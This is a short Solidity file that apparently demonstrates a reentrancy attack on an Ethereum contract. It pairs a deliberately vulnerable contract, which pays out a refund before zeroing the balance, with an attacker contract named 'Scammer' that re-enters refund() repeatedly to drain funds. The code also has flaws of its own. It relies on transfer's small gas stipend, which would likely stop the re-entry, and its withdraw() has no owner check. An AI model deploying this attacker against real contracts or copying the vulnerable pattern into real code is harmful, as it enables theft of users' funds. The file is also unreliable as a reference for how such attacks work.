pragma solidity ^0.4.19;


contract VulnerableContract {
 
  mapping (address => uint) balances;
 
  function refund() {
    msg.sender.transfer(balances[msg.sender]);
    balances[msg.sender] = 0;
  }
 
  function () public payable {
    balances[msg.sender] = balances[msg.sender] + msg.value;
  }
 
}

contract Scammer {
 
  VulnerableContract public vulnerableContract;
 
  uint public counter;
 
  uint public constant COUNTER_LIMIT = 10;
 
  uint public invested;
 
  function withdraw() {
    msg.sender.transfer(this.balance);
  }
 
  function startAttack(address newVulnerableContract) public payable {
    invested = msg.value;
    vulnerableContract = VulnerableContract(newVulnerableContract);
    vulnerableContract.transfer(msg.value);
    vulnerableContract.refund();
  }
 
  function () public payable {
    if(vulnerableContract.balance > invested && counter < COUNTER_LIMIT) {
      vulnerableContract.refund();
      counter++;
    }
  }
 
}